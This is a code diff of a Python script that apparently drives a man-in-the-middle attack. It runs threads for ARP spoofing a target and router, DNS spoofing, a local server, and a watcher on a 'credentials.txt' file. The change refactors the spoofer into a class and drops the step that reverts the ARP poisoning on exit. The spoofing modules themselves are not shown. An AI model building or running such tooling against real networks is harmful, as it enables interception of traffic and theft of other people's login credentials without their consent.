@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 
-import arp_spoofer
+from arp_spoofer import ArpSpoof
 import dns_spoofer
 
 import argparse
@@ -12,12 +12,11 @@ import time
 from termcolor import colored
 from server import Server
 
+spoof = None
+
 # Controlled quite
 def def_handler(sig, frame):
     print(colored("\n[!] Quitting the program...\n", "red"))
-    arp_spoofer.revert_spoof()
-    stop_event.set()
-    
     os._exit(1)
 
 signal.signal(signal.SIGINT, def_handler) # CTRL + C
@@ -88,14 +87,17 @@ def main():
     print_banner()
     verify_root()
 
-    global threads, stop_event
+    global threads, stop_event, spoof
 
     stop_event = threading.Event()
     threads = []
     target, interface, router, mac_address, ip_server = get_arguments()
 
-    isValid = arp_spoofer.verify(target, interface, router, mac_address) # Verify format arguments
-    define_thread(args=(target, interface, router, mac_address, stop_event, isValid), function=arp_spoofer.main)
+
+    spoof = ArpSpoof(target, interface, router, mac_address)
+    spoof.verify() # Verify format arguments
+
+    define_thread(args=(None,), function=spoof.start)
     define_thread(args=(ip_server,), function=server)
     define_thread(args=(ip_server,), function=dns_spoofer.main)
     define_thread(args=('credentials.txt',), function=verify_file)
